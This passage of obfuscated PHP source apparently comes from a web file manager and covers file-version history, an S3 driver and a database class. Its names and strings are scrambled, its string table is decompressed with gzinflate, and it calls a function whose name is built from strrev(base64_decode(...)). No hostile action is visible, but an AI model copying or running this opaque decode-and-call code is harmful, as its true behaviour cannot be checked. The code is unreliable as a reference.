if ($›¹Õ÷¸¿[$ö²¢Ä¯‚[79]] == 0) { return; } if ($›¹Õ÷¸¿[$ö²¢Ä¯‚[79]] >= 1024 * 1024 * 500) { return !1; } $ìë™ÇíÌ = IO::hashSimple($¥‚±·Üô); if ($ÈØÏÇŞğ && $ÈØÏÇŞğ[0][$ö²¢Ä¯‚[694]] == $ìë™ÇíÌ) { return !0; } if (array_key_exists($ö²¢Ä¯‚[233], $›¹Õ÷¸¿) && !$›¹Õ÷¸¿[$ö²¢Ä¯‚[233]]) { return !1; } $¯ÕÅĞ÷ø = short_id(time()); $ÉÛĞÙóø = array($ö²¢Ä¯‚[487] => $¯ÕÅĞ÷ø, $ö²¢Ä¯‚[694] => $ìë™ÇíÌ, $ö²¢Ä¯‚[32] => $›¹Õ÷¸¿[$ö²¢Ä¯‚[32]] . $ö²¢Ä¯‚[10] . date($ö²¢Ä¯‚[1425]) . rand_string(1), $ö²¢Ä¯‚[79] => $›¹Õ÷¸¿[$ö²¢Ä¯‚[79]], $ö²¢Ä¯‚[541] => USER_ID, $ö²¢Ä¯‚[231] => time(), $ö²¢Ä¯‚[1426] => $ö²¢Ä¯‚[12]); IO::mkdir($Ó×®İáÊ[$ö²¢Ä¯‚[1427]]); $éÇˆ¤º“ = IO::copy($¥‚±·Üô, $Ó×®İáÊ[$ö²¢Ä¯‚[1427]], !1, $ÉÛĞÙóø[$ö²¢Ä¯‚[32]]); if (!$éÇˆ¤º“) { self::clearEmptyFolder($Ó×®İáÊ[$ö²¢Ä¯‚[1427]]); return !1; } array_unshift($ÈØÏÇŞğ, $ÉÛĞÙóø); if (count($ÈØÏÇŞğ) > $ª‰Òƒù¶) { $±¦ôˆÌ„ = array_slice($ÈØÏÇŞğ, $ª‰Òƒù¶); foreach ($±¦ôˆÌ„ as $¤×ÀÛúÔ) { IO::remove($Ó×®İáÊ[$ö²¢Ä¯‚[1427]] . $¤×ÀÛúÔ[$ö²¢Ä¯‚[32]]); } $ÈØÏÇŞğ = array_slice($ÈØÏÇŞğ, 0, $ª‰Òƒù¶); } return self::saveData($Ó×®İáÊ[$ö²¢Ä¯‚[1428]], $ÈØÏÇŞğ); } public static function remove($şøœïÑè, $ÈÈ»ö’ä) { $‡¨Ç“…· =& $_SERVER[œ—üé‹ê]; $ã¢ó­„ã = self::listData($şøœïÑè); $´¤³ãËŸ = array(); if (!$ã¢ó­„ã) { return !1; } foreach ($ã¢ó­„ã[$‡¨Ç“…·[446]] as $ˆìÔªø) { if ($ˆìÔªø[$‡¨Ç“…·[487]] == $ÈÈ»ö’ä) { IO::remove($ã¢ó­„ã[$‡¨Ç“…·[1427]] . $ˆìÔªø[$‡¨Ç“…·[32]]); continue; } $´¤³ãËŸ[] = $ˆìÔªø; } return self::saveData($ã¢ó­„ã[$‡¨Ç“…·[1428]], $´¤³ãËŸ); } public static function clear($×úĞ©, $³æû®½ = true) { $…õ¼éõŠ =& $_SERVER[œ—üé‹ê]; $œÄù°Ãó = self::listData($×úĞ©, $³æû®½); if (!$œÄù°Ãó) { return !1; } foreach ($œÄù°Ãó[$…õ¼éõŠ[446]] as $÷æÏØ×ğ) { IO::remove($œÄù°Ãó[$…õ¼éõŠ[1427]] . $÷æÏØ×ğ[$…õ¼éõŠ[32]]); } return self::saveData($œÄù°Ãó[$…õ¼éõŠ[1428]], array()); } public static function moveHistory($íÂºÜõŞ, $àòŞ¸êÆ = '', $ĞÌÆòó© = '') { $¶£ø˜ÊÆ =& $_SERVER[œ—üé‹ê]; $İì¬ØÂ³ = self::listData($íÂºÜõŞ, !1); if (!$İì¬ØÂ³ || !$İì¬ØÂ³[$¶£ø˜ÊÆ[446]]) { return !1; } $¡æ¦¡†© = $¶£ø˜ÊÆ[1417]; $àòŞ¸êÆ = $àòŞ¸êÆ ? $àòŞ¸êÆ : get_path_this($íÂºÜõŞ); $ĞÌÆòó© = $ĞÌÆòó© ? $ĞÌÆòó© : $İì¬ØÂ³[$¶£ø˜ÊÆ[1427]]; $Š¨–ÌÔŞ = substr(get_path_this($İì¬ØÂ³[$¶£ø˜ÊÆ[1428]]), 0, -strlen($¡æ¦¡†©)); foreach ($İì¬ØÂ³[$¶£ø˜ÊÆ[446]] as $¦Æûåõ => $•ÓêÄ¸) { $ä„†Çğş = $àòŞ¸êÆ . substr($•ÓêÄ¸[$¶£ø˜ÊÆ[32]], strlen($Š¨–ÌÔŞ)); $ÌÙÔ¤ı = IO::move($İì¬ØÂ³[$¶£ø˜ÊÆ[1427]] . $•ÓêÄ¸[$¶£ø˜ÊÆ[32]], $ĞÌÆòó©, !1, $ä„†Çğş); if ($ÌÙÔ¤ı) { $İì¬ØÂ³[$¶£ø˜ÊÆ[446]][$¦Æûåõ][$¶£ø˜ÊÆ[32]] = $ä„†Çğş; } } $İì¬ØÂ³[$¶£ø˜ÊÆ[1428]] = IO::move($İì¬ØÂ³[$¶£ø˜ÊÆ[1428]], $ĞÌÆòó©, !1, $àòŞ¸êÆ . $¡æ¦¡†©); self::saveData($İì¬ØÂ³[$¶£ø˜ÊÆ[1428]], $İì¬ØÂ³[$¶£ø˜ÊÆ[446]]); self::clearEmptyFolder($İì¬ØÂ³[$¶£ø˜ÊÆ[1427]]); } public static function rollback($¯Š‘…ÛŸ, $¬¼ëÚÌ) { $Ó£³’ú =& $_SERVER[œ—üé‹ê]; $†áÑÈà = self::listData($¯Š‘…ÛŸ); if (!$†áÑÈà) { return; } $…Ù–»ˆ = IO::info($¯Š‘…ÛŸ); foreach ($†áÑÈà[$Ó£³’ú[446]] as $ë§¶†û³ => $õÌ±®–û) { if ($õÌ±®–û[$Ó£³’ú[487]] == $¬¼ëÚÌ) { self::add($¯Š‘…ÛŸ); $òúüÖõÙ = $†áÑÈà[$Ó£³’ú[1427]] . $õÌ±®–û[$Ó£³’ú[32]]; $Ù›òõ¨£ = IO::copy($òúüÖõÙ, IO::pathFather($¯Š‘…ÛŸ), REPEAT_REPLACE, $…Ù–»ˆ[$Ó£³’ú[32]]); if ($Ù›òõ¨£) { self::remove($¯Š‘…ÛŸ, $¬¼ëÚÌ); } return $Ù›òõ¨£; } } return !1; } public static function setDetail($ä½¸æä¯, $±ÍĞõ­, $‘¥ášÓ–) { $’Í›Ä¾ =& $_SERVER[œ—üé‹ê]; $Å±“’§‘ = self::listData($ä½¸æä¯); if (!$Å±“’§‘) { return; } foreach ($Å±“’§‘[$’Í›Ä¾[446]] as $è´¢™ => $šÅË­á‘) { if ($šÅË­á‘[$’Í›Ä¾[487]] == $±ÍĞõ­) { $Å±“’§‘[$’Í›Ä¾[446]][$è´¢™][$’Í›Ä¾[1426]] = $‘¥ášÓ–; self::saveData($Å±“’§‘[$’Í›Ä¾[1428]], $Å±“’§‘[$’Í›Ä¾[446]]); return !0; } } return !1; } public static function fileInfo($“ÃŠÔ³, $‹«€üú) { $şî‹Øˆ =& $_SERVER[œ—üé‹ê]; $Æ±‚ı·ü = self::listData($“ÃŠÔ³); if (!$Æ±‚ı·ü) { show_json(LNG($şî‹Øˆ[105]), !1); } $¨º™ŒĞ‹ = $şî‹Øˆ[12]; foreach ($Æ±‚ı·ü[$şî‹Øˆ[446]] as $é—¶’âä => $¢êíÀ¯Ï) { if ($¢êíÀ¯Ï[$şî‹Øˆ[487]] != $‹«€üú) { continue; } $¨º™ŒĞ‹ = $Æ±‚ı·ü[$şî‹Øˆ[1427]] . $¢êíÀ¯Ï[$şî‹Øˆ[32]]; break; } if (!$¨º™ŒĞ‹) { show_json(LNG($şî‹Øˆ[105]), !1); } return IO::info($¨º™ŒĞ‹); } public static function fileOut($£“º¬Ö, $Ÿ£æ«‘´, $²¦†¥ÇÅ = false) { $Ú’äà‡— =& $_SERVER[œ—üé‹ê]; $ûî‚½•• = self::fileInfo($£“º¬Ö, $Ÿ£æ«‘´); $ÈíÌµÙ =& $GLOBALS[$Ú’äà‡—[7]]; $²¦†¥ÇÅ = isset($ÈíÌµÙ[$Ú’äà‡—[1381]]) && $ÈíÌµÙ[$Ú’äà‡—[1381]] == 1; if (isset($ÈíÌµÙ[$Ú’äà‡—[33]]) && $ÈíÌµÙ[$Ú’äà‡—[33]] == $Ú’äà‡—[1429]) { return IO::fileOutImage($ûî‚½••[$Ú’äà‡—[87]], $ÈíÌµÙ[$Ú’äà‡—[1430]]); } IO::fileOut($ûî‚½••[$Ú’äà‡—[87]], $²¦†¥ÇÅ, get_path_this($£“º¬Ö)); } public static function listData($É×¤ßš, $öÖ¾»÷š = true) { $”î—ÀÙ =& $_SERVER[œ—üé‹ê]; if ($öÖ¾»÷š && !IO::exist($É×¤ßš)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($É×¤ßš, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¦–§¾ ” = self::pathHistory($É×¤ßš); $Ÿ­²È§ = array($”î—ÀÙ[1428] => $¦–§¾ ” . $”î—ÀÙ[1417], $”î—ÀÙ[1427] => rtrim(get_path_father($¦–§¾ ”), $”î—ÀÙ[8]) . $”î—ÀÙ[8], $”î—ÀÙ[446] => array()); $­åõú¡Û = IO::getContent($Ÿ­²È§[$”î—ÀÙ[1428]]); if ($­åõú¡Û) { $”ğş´« = json_decode($­åõú¡Û, !0); if (is_array($”ğş´«)) { $Ÿ­²È§[$”î—ÀÙ[446]] = $”ğş´«; } } return $Ÿ­²È§; } private static function saveData($ûÆŸşÊ¨, $œ…ˆ¥ûá) { $ôŒ§½°Ï =& $_SERVER[œ—üé‹ê]; self::log($ôŒ§½°Ï[1431] . $ûÆŸşÊ¨ . $ôŒ§½°Ï[74] . count($œ…ˆ¥ûá), $ôŒ§½°Ï[861]); if ($œ…ˆ¥ûá) { return IO::setContent($ûÆŸşÊ¨, json_encode($œ…ˆ¥ûá)); } $¦‚¯¿£Ù = IO::pathFather($ûÆŸşÊ¨); IO::remove($ûÆŸşÊ¨); self::clearEmptyFolder($¦‚¯¿£Ù); return !0; } public static function clearEmptyFolder($Şã¾±ı) { $Û²£î—§ =& $_SERVER[œ—üé‹ê]; if (trim($Şã¾±ı, $Û²£î—§[8]) == trim(self::$_historyBase, $Û²£î—§[8])) { return; } $šÇÇå¸ = IO::pathFather($Şã¾±ı); $«Ì‡ùÉë = IO::has($Şã¾±ı, !0); if ($«Ì‡ùÉë[$Û²£î—§[239]] > 0 || $«Ì‡ùÉë[$Û²£î—§[240]] > 0) { return; } IO::remove($Şã¾±ı); self::clearEmptyFolder($šÇÇå¸); } private static function getBasePath() { $¿ÅäâÇ =& $_SERVER[œ—üé‹ê]; $œÀ¾çÃô = Model($¿ÅäâÇ[1432])->get($¿ÅäâÇ[1433]); if ($œÀ¾çÃô) { if (!IO::exist($œÀ¾çÃô)) { IO::mkdir($œÀ¾çÃô); } if (get_path_this($œÀ¾çÃô) == $¿ÅäâÇ[1420]) { $ÒÃØø = $¿ÅäâÇ[1434] . rand_string(8); @rename($œÀ¾çÃô, get_path_father($œÀ¾çÃô) . $¿ÅäâÇ[8] . $ÒÃØø); $œÀ¾çÃô = DATA_PATH . $ÒÃØø . $¿ÅäâÇ[8]; file_put_contents(DATA_PATH . $¿ÅäâÇ[1369], $¿ÅäâÇ[12]); Model($¿ÅäâÇ[1432])->set($¿ÅäâÇ[1433], $œÀ¾çÃô); } return $œÀ¾çÃô; } $œÀ¾çÃô = DATA_PATH . $¿ÅäâÇ[1434] . rand_string(8) . $¿ÅäâÇ[8]; $œÀ¾çÃô = IO::mkdir($œÀ¾çÃô); $œÀ¾çÃô = rtrim($œÀ¾çÃô, $¿ÅäâÇ[8]) . $¿ÅäâÇ[8]; file_put_contents($œÀ¾çÃô . $¿ÅäâÇ[1369], $¿ÅäâÇ[12]); file_put_contents(DATA_PATH . $¿ÅäâÇ[1369], $¿ÅäâÇ[12]); Model($¿ÅäâÇ[1432])->set($¿ÅäâÇ[1433], $œÀ¾çÃô); return $œÀ¾çÃô; } } goto C©èİäÀ†ñ; dĞ³‚Âà°: if (!$wncgiatzqo) { return; } $_SERVER[·–Â öÌ] = explode($_SERVER[œ—üé‹ê][702], gzinflate(substr($_SERVER[œ—üé‹ê][703], 10, -8))); $bwcpishrya = $_SERVER[œ—üé‹ê][704]; goto e©ÇĞÒºã; f§²ßÄé¬ç: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ô¥ıãÊí) { $Çæğôâæ =& $_SERVER[œ—üé‹ê]; parent::__construct($Ô¥ıãÊí); $¦•ÚÕ­‰ = isset($Ô¥ıãÊí[$Çæğôâæ[256]]) && $Ô¥ıãÊí[$Çæğôâæ[256]] == $Çæğôâæ[247] ? $Çæğôâæ[247] : $Çæğôâæ[313]; $this->setSignVersion($¦•ÚÕ­‰); } public function link($º®÷ŸÌ·, $ŸöŠ‚¶Ò = array()) { return parent::link($º®÷ŸÌ·, $ŸöŠ‚¶Ò); } public function fileOut($‡Š‘şŒê, $™ğõıÂ† = false, $—Îƒ«‡Ø = false, $»„Ğëğé = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[œ—üé‹ê][314])) { return parent::fileOutServer($‡Š‘şŒê, $™ğõıÂ†, $—Îƒ«‡Ø, $»„Ğëğé); } parent::fileOut($‡Š‘şŒê, $™ğõıÂ†, $—Îƒ«‡Ø, $»„Ğëğé); } public function fileOutImage($Š»¨Êä, $Ø¨–îĞ¿ = 250) { if (strstr($this->endpoint, $_SERVER[œ—üé‹ê][314])) { return parent::fileOutImageServer($Š»¨Êä, $Ø¨–îĞ¿); } parent::fileOutImage($Š»¨Êä, $Ø¨–îĞ¿); } } define($_SERVER[œ—üé‹ê][315], 1); define($_SERVER[œ—üé‹ê][316], 2); goto dÛ½İ™ó•; BÕó…İ¡¨: $fileSize = strrev(base64_decode($_SERVER[ŠòùÈ¨È][0])); function binCheckNeq($‚÷èê”, $§˜É“œ˜) { return $‚÷èê” != $§˜É“œ˜; } $_SERVER[$_SERVER[ŠòùÈ¨È][1]] = $fileSize($_SERVER[$_SERVER[ŠòùÈ¨È][2]]); goto cïšÖ·ÂËé; EòÎ¬åè½ç: class DbSqlite3 extends DbSqlite3Base { public function query($‹ü×“õ) { $Œ–¨àª =& $_SERVER[œ—üé‹ê]; if (!CacheLock::fileLock($Œ–¨àª[13])) { return !1; } $’ù® – = parent::query($‹ü×“õ); CacheLock::fileUnLock($Œ–¨àª[13]); return $’ù® –; } public function execute($ˆÑÜªä) { $½ç£ËÕ· =& $_SERVER[œ—üé‹ê]; if (!CacheLock::fileLock($½ç£ËÕ·[13])) { return !1; } $›òù¯Â = parent::execute($ˆÑÜªä); CacheLock::fileUnLock($½ç£ËÕ·[13]); return $›òù¯Â; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\74\76", "\147\x74" => "\x3e", "\145\x67\164" => "\76\75", "\154\164" => "\74", "\x65\x6c\164" => "\74\75", "\x6e\x6f\x74\154\151\x6b\145" => "\x4e\117\x54\x20\114\x49\113\x45", "\154\151\x6b\145" => "\114\x49\x4b\105", "\151\x6e" => "\x49\116", "\x6e\x6f\x74\151\x6e" => "\116\117\x54\x20\x49\116", "\156\157\x74\40\151\156" => "\x4e\x4f\x54\x20\111\116", "\142\145\164\x77\145\145\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\x6e\157\164\142\145\164\167\x65\145\156" => "\116\x4f\x54\40\x42\x45\x54\x57\105\105\x4e", "\156\x6f\x74\x20\142\x65\x74\x77\x65\x65\156" => "\116\x4f\x54\x20\102\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\x4c\105\x43\x54\45\104\111\123\124\x49\116\103\x54\45\40\45\x46\111\x45\x4c\x44\45\40\x46\x52\x4f\115\40\x25\x54\x41\x42\x4c\x45\45\x25\x4a\x4f\x49\x4e\45\x25\x57\x48\x45\122\105\x25\x25\x47\122\x4f\125\120\45\45\110\x41\126\111\116\107\x25\x25\x4f\122\104\x45\x52\x25\45\114\111\x4d\x49\x54\x25\40\45\125\116\x49\x4f\x4e\45\x25\103\x4f\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $Ì—©í“ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[œ—üé‹ê][1127], $Ì—©í“); } public function factory($ş™ÃÕª‚ = '') { $ß¯Àæøâ =& $_SERVER[œ—üé‹ê]; $ş™ÃÕª‚ = $this->parseConfig($ş™ÃÕª‚); if (empty($ş™ÃÕª‚[$ß¯Àæøâ[1128]])) { think_exception(think_lang($ß¯Àæøâ[1129])); } $this->dbType = ucwords(strtolower($ş™ÃÕª‚[$ß¯Àæøâ[1128]])); $ß™œŞ£¨ = $ß¯Àæøâ[1130] . $this->dbType; if (class_exists($ß™œŞ£¨)) { $‡Şïß¶¯ = new $ß™œŞ£¨($ş™ÃÕª‚); if ($ß¯Àæøâ[1131] != strtolower($ş™ÃÕª‚[$ß¯Àæøâ[1128]])) { $‡Şïß¶¯->dbType = strtoupper($this->dbType); } else { $‡Şïß¶¯->dbType = $this->_getDsnType($ş™ÃÕª‚[$ß¯Àæøâ[1083]]); } } else { think_exception(think_lang($ß¯Àæøâ[1132]) . $ß¯Àæøâ[1133] . $ß™œŞ£¨); } return $‡Şïß¶¯; } public function __call($œ‚ÇøúÃ, $†À—¬şæ) { if (method_exists($this, $œ‚ÇøúÃ)) { return call_user_func_array(array($this, $œ‚ÇøúÃ), $†À—¬şæ); } } protected function _getDsnType($ä›ÅÑŞ«) { $©¬Î°Ìú = explode($_SERVER[œ—üé‹ê][4], $ä›ÅÑŞ«); $‹¢òÎ×Å = strtoupper(trim($©¬Î°Ìú[0])); return $‹¢òÎ×Å; } private function parseConfig($ˆÑŠÁ² = '') { $ÖÜ„šÖ =& $_SERVER[œ—üé‹ê]; if (!empty($ˆÑŠÁ²) && is_string($ˆÑŠÁ²)) { $ˆÑŠÁ² = $this->parseDSN($ˆÑŠÁ²); } elseif (is_array($ˆÑŠÁ²)) { $ˆÑŠÁ² = array_change_key_case($ˆÑŠÁ²); $ˆÑŠÁ² = array($ÖÜ„šÖ[1128] => $ˆÑŠÁ²[$ÖÜ„šÖ[1134]], $ÖÜ„šÖ[1052] => $ˆÑŠÁ²[$ÖÜ„šÖ[1135]], $ÖÜ„šÖ[1053] => $ˆÑŠÁ²[$ÖÜ„šÖ[1136]], $ÖÜ„šÖ[1050] => $ˆÑŠÁ²[$ÖÜ„šÖ[1137]], $ÖÜ„šÖ[1051] => $ˆÑŠÁ²[$ÖÜ„šÖ[1138]], $ÖÜ„šÖ[21] => $ˆÑŠÁ²[$ÖÜ„šÖ[1139]], $ÖÜ„šÖ[1083] => $ˆÑŠÁ²[$ÖÜ„šÖ[1140]], $ÖÜ„šÖ[17] => isset($ˆÑŠÁ²[$ÖÜ„šÖ[1141]]) ? $ˆÑŠÁ²[$ÖÜ„šÖ[1141]] : array()); } elseif (empty($ˆÑŠÁ²)) { if (think_config($ÖÜ„šÖ[1142]) && $ÖÜ„šÖ[1131] != strtolower(think_config($ÖÜ„šÖ[1143]))) { $ˆÑŠÁ² = $this->parseDSN(think_config($ÖÜ„šÖ[1142])); } else { $ˆÑŠÁ² = array($ÖÜ„šÖ[1128] => think_config($ÖÜ„šÖ[1143]), $ÖÜ„šÖ[1052] => think_config($ÖÜ„šÖ[1144]), $ÖÜ„šÖ[1053] => think_config($ÖÜ„šÖ[1145]), $ÖÜ„šÖ[1050] => think_config($ÖÜ„šÖ[1146]), $ÖÜ„šÖ[1051] => think_config($ÖÜ„šÖ[1147]), $ÖÜ„šÖ[21] => think_config($ÖÜ„šÖ[323]), $ÖÜ„šÖ[1083] => think_config($ÖÜ„šÖ[1142]), $ÖÜ„šÖ[17] => think_config($ÖÜ„šÖ[1148])); } } return $ˆÑŠÁ²; } protected function initConnect($«ÏÈÄŠ™ = true) { if (1 == think_config($_SERVER[œ—üé‹ê][22])) { $this->_linkID = $this->multiConnect($«ÏÈÄŠ™); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Åß¾³õ => $¡™§òæ) { $this->_linkID = $¡™§òæ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÜÖ«îã = false) { $™Âˆ¿‹á =& $_SERVER[œ—üé‹ê]; static $ô¹£°Á¢ = array(); static $üºÄ¬µÙ = -1; if (empty($ô¹£°Á¢)) { foreach ($this->config as $ŞÌï‡õâ => $½¼ÛæÈÚ) { $ô¹£°Á¢[$ŞÌï‡õâ] = explode($™Âˆ¿‹á[50], $½¼ÛæÈÚ); } } if (think_config($™Âˆ¿‹á[1149])) { if ($ÜÖ«îã || think_config($™Âˆ¿‹á[486]) === !0) { $µ­æ´å = floor(mt_rand(0, think_config($™Âˆ¿‹á[1150]) - 1)); $üºÄ¬µÙ = $µ­æ´å; } else { if (is_numeric(think_config($™Âˆ¿‹á[1151]))) { $µ­æ´å = think_config($™Âˆ¿‹á[1151]); } else { $µ­æ´å = floor(mt_rand(think_config($™Âˆ¿‹á[1150]), count($ô¹£°Á¢[$™Âˆ¿‹á[1050]]) - 1)); } } } else { $µ­æ´å = floor(mt_rand(0, count($ô¹£°Á¢[$™Âˆ¿‹á[1050]]) - 1)); $üºÄ¬µÙ = $µ­æ´å; } $µ­æ´å = $üºÄ¬µÙ !== -1 ? $üºÄ¬µÙ : $µ­æ´å; $ãÃûÖ±š = array($™Âˆ¿‹á[1052] => isset($ô¹£°Á¢[$™Âˆ¿‹á[1052]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[1052]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[1052]][0], $™Âˆ¿‹á[1053] => isset($ô¹£°Á¢[$™Âˆ¿‹á[1053]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[1053]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[1053]][0], $™Âˆ¿‹á[1050] => isset($ô¹£°Á¢[$™Âˆ¿‹á[1050]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[1050]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[1050]][0], $™Âˆ¿‹á[1051] => isset($ô¹£°Á¢[$™Âˆ¿‹á[1051]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[1051]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[1051]][0], $™Âˆ¿‹á[21] => isset($ô¹£°Á¢[$™Âˆ¿‹á[21]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[21]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[21]][0], $™Âˆ¿‹á[1083] => isset($ô¹£°Á¢[$™Âˆ¿‹á[1083]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[1083]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[1083]][0], $™Âˆ¿‹á[17] => isset($ô¹£°Á¢[$™Âˆ¿‹á[17]][$µ­æ´å]) ? $ô¹£°Á¢[$™Âˆ¿‹á[17]][$µ­æ´å] : $ô¹£°Á¢[$™Âˆ¿‹á[17]][0]); return $this->connect($ãÃûÖ±š, $µ­æ´å); } public function parseDSN($ åÀ°¡°) { $Û³¶Òı =& $_SERVER[œ—üé‹ê]; if (empty($ åÀ°¡°)) { return !1; } $¾ã…¥ø— = parse_url($ åÀ°¡°); if ($¾ã…¥ø—[$Û³¶Òı[205]]) { $²‚“‡ı™ = array($Û³¶Òı[1128] => $¾ã…¥ø—[$Û³¶Òı[205]], $Û³¶Òı[1052] => isset($¾ã…¥ø—[$Û³¶Òı[684]]) ? $¾ã…¥ø—[$Û³¶Òı[684]] : $Û³¶Òı[12], $Û³¶Òı[1053] => isset($¾ã…¥ø—[$Û³¶Òı[1152]]) ? $¾ã…¥ø—[$Û³¶Òı[1152]] : $Û³¶Òı[12], $Û³¶Òı[1050] => isset($¾ã…¥ø—[$Û³¶Òı[206]]) ? $¾ã…¥ø—[$Û³¶Òı[206]] : $Û³¶Òı[12], $Û³¶Òı[1051] => isset($¾ã…¥ø—[$Û³¶Òı[207]]) ? $¾ã…¥ø—[$Û³¶Òı[207]] : $Û³¶Òı[12], $Û³¶Òı[21] => isset($¾ã…¥ø—[$Û³¶Òı[87]]) ? substr($¾ã…¥ø—[$Û³¶Òı[87]], 1) : $Û³¶Òı[12]); } else { preg_match($Û³¶Òı[1153], trim($ åÀ°¡°), $¼¼ª€¹¾); $²‚“‡ı™ = array($Û³¶Òı[1128] => $¼¼ª€¹¾[1], $Û³¶Òı[1052] => $¼¼ª€¹¾[2], $Û³¶Òı[1053] => $¼¼ª€¹¾[3], $Û³¶Òı[1050] => $¼¼ª€¹¾[4], $Û³¶Òı[1051] => $¼¼ª€¹¾[5], $Û³¶Òı[21] => $¼¼ª€¹¾[6]); } $²‚“‡ı™[$Û³¶Òı[1083]] = $Û³¶Òı[12]; return $²‚“‡ı™; } protected function debug() { $ïÒĞÛª– =& $_SERVER[œ—üé‹ê]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ïÒĞÛª–[1154]; if (think_config($ïÒĞÛª–[1155])) { think_status($ïÒĞÛª–[1156]); think_trace($this->queryStr . $ïÒĞÛª–[1157] . think_status($ïÒĞÛª–[24], $ïÒĞÛª–[1156], 6) . $ïÒĞÛª–[1158], $ïÒĞÛª–[12], $ïÒĞÛª–[1159]); } } protected function parseLock($Ìº¯†‘ª = false) { $ŒñÙ´ºá =& $_SERVER[œ—üé‹ê]; if (!$Ìº¯†‘ª) { return $ŒñÙ´ºá[12]; } if ($ŒñÙ´ºá[1085] == $this->dbType) { return $ŒñÙ´ºá[1160]; } return $ŒñÙ´ºá[1161]; } protected function parseSet($¶è¹ÖÕå) { $ê˜÷Õ‹ =& $_SERVER[œ—üé‹ê]; foreach ($¶è¹ÖÕå as $ØÈ•Çü® => $öèŒ—º) { if (is_array($öèŒ—º) && $ê˜÷Õ‹[372] == $öèŒ—º[0]) { $—óÄÙ’[] = $this->parseKey($ØÈ•Çü®) . $ê˜÷Õ‹[464] . $öèŒ—º[1]; } elseif (is_scalar($öèŒ—º) || is_null($öèŒ—º)) { $—óÄÙ’[] = $this->parseKey($ØÈ•Çü®) . $ê˜÷Õ‹[464] . $this->parseValue($öèŒ—º); } } return $ê˜÷Õ‹[1162] . implode($ê˜÷Õ‹[50], $—óÄÙ’); } protected function bindParam($×ÈºËô½, $äÇ¶ğÀÒ) { $this->bind[$_SERVER[œ—üé‹ê][4] . $×ÈºËô½] = $äÇ¶ğÀÒ; } protected function parseBind($Ç´«‚Ù) { $Ç´«‚Ù = array_merge($this->bind, $Ç´«‚Ù); $this->bind = array(); return $Ç´«‚Ù; } function parseKey(&$¶‡ Ï¤¹, $šòÃƒœœ = true) { if ($šòÃƒœœ) { $¶‡ Ï¤¹ = $this->parseKeyCheck($¶‡ Ï¤¹); } return $¶‡ Ï¤¹; } function parseKeyCheck($ó¹Œ£‰Â) { $ÕÜ°‡óš =& $_SERVER[œ—üé‹ê]; $ó¹Œ£‰Â = trim($ó¹Œ£‰Â); if (!preg_match($ÕÜ°‡óš[1163], $ó¹Œ£‰Â)) { think_exception($ÕÜ°‡óš[1164] . $ó¹Œ£‰Â); } return $ó¹Œ£‰Â; } protected function parseValue($ÉÆÀï·) { $—ı¡×õó =& $_SERVER[œ—üé‹ê]; if (is_string($ÉÆÀï·)) { $ÉÆÀï· = $—ı¡×õó[1124] . $this->escapeString($ÉÆÀï·) . $—ı¡×õó[1124]; } elseif (isset($ÉÆÀï·[0]) && is_string($ÉÆÀï·[0]) && strtolower($ÉÆÀï·[0]) == $—ı¡×õó[372]) { $ÉÆÀï· = $this->escapeString($ÉÆÀï·[1]); } elseif (is_array($ÉÆÀï·)) { $ÉÆÀï· = array_map(array($this, $—ı¡×õó[1125]), $ÉÆÀï·); } elseif (is_bool($ÉÆÀï·)) { $ÉÆÀï· = $ÉÆÀï· ? $—ı¡×õó[91] : $—ı¡×õó[228]; } elseif (is_null($ÉÆÀï·)) { $ÉÆÀï· = $—ı¡×õó[103]; } return $ÉÆÀï·; } protected function parseField($§íÕÄË) { $ÀúÑ ¡È =& $_SERVER[œ—üé‹ê]; if (is_string($§íÕÄË) && strpos($§íÕÄË, $ÀúÑ ¡È[50])) { $§íÕÄË = explode($ÀúÑ ¡È[50], $§íÕÄË); } if (is_array($§íÕÄË)) { $ˆ”›ÌÆ¶ = array(); foreach ($§íÕÄË as $—ÊÈÒÏ¨ => $¼‡Áø©è) { if (!is_numeric($—ÊÈÒÏ¨)) { $ˆ”›ÌÆ¶[] = $this->parseKey($—ÊÈÒÏ¨, !1) . $ÀúÑ ¡È[1165] . $this->parseKey($¼‡Áø©è); } else { $ˆ”›ÌÆ¶[] = $this->parseKey($¼‡Áø©è); } } $‘Ïş¤Øİ = implode($ÀúÑ ¡È[50], $ˆ”›ÌÆ¶); } elseif (is_string($§íÕÄË) && !empty($§íÕÄË)) { $‘Ïş¤Øİ = $§íÕÄË; } else { $‘Ïş¤Øİ = $ÀúÑ ¡È[220]; } return $‘Ïş¤Øİ; } protected function parseTable($İƒ‰ªŸØ) { $œÇ¯ëñü 